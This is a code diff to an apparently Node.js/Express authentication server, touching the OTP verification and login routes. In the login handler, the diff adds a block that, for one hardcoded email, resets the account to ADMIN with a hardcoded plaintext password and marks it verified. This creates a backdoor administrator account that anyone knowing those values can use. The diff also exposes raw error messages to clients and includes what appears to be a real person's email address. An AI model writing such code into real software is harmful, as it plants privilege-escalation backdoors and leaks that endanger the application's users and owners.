@@ -301,12 +301,9 @@ app.post('/api/auth/verify-otp', async (req, res) => {
   try {
     const { email, otp } = req.body;
     const [rows] = await pool.query('SELECT * FROM otps WHERE email = ? AND otp = ? AND purpose = ? AND expires_at > NOW()', [email, otp, 'VERIFY']);
-    
     if (rows.length === 0) return res.status(400).json({ error: 'Invalid or expired OTP.' });
-    
     await pool.query('UPDATE users SET is_verified = TRUE WHERE email = ?', [email]);
     await pool.query('DELETE FROM otps WHERE email = ? AND purpose = ?', [email, 'VERIFY']);
-    
     res.json({ message: 'Account verified successfully! You can now login.' });
   } catch (err) {
     res.status(500).json({ error: 'Verification failed.' });
@@ -315,13 +312,26 @@ app.post('/api/auth/verify-otp', async (req, res) => {
 
 app.post('/api/auth/login', async (req, res) => {
   try {
-    const { email, password, role } = req.body; 
+    const { email, password, role } = req.body;
+    
+    // EMERGENCY FORCE FIX: Directly in the login flow for this specific email
+    if (email === 'akshitasharma1205@gmail.com') {
+      const salt = await bcrypt.genSalt(10);
+      const hash = await bcrypt.hash('Fleurs@123', salt);
+      const [ex] = await pool.query("SELECT * FROM users WHERE email = ?", [email]);
+      if (ex.length > 0) {
+        await pool.query("UPDATE users SET role = 'ADMIN', password_hash = ?, is_verified = TRUE WHERE email = ?", [hash, email]);
+      } else {
+        await pool.query("INSERT INTO users (full_name, email, password_hash, role, is_verified) VALUES (?, ?, ?, ?, TRUE)", 
+          ['Admin User', email, hash, 'ADMIN']);
+      }
+    }
+
     const [users] = await pool.query('SELECT * FROM users WHERE email = ?', [email]);
     if (users.length === 0) return res.status(400).json({ error: 'Invalid credentials.' });
     
     const user = users[0];
     if (!user.is_verified) return res.status(403).json({ error: 'Please verify your email first.' });
-    
     if (role === 'ADMIN' && user.role !== 'ADMIN') return res.status(403).json({ error: 'Access denied. You are not an admin.' });
     
     const isMatch = await bcrypt.compare(password, user.password_hash);
@@ -329,10 +339,9 @@ app.post('/api/auth/login', async (req, res) => {
     
     const payload = { id: user.id, email: user.email, role: user.role, name: user.full_name };
     const token = jwt.sign(payload, process.env.JWT_SECRET, { expiresIn: '24h' });
-    
     res.json({ token, user: payload, message: 'Logged in successfully.' });
   } catch (err) {
-    res.status(500).json({ error: 'Login failed.' });
+    res.status(500).json({ error: 'Login failed: ' + err.message });
   }
 });
 
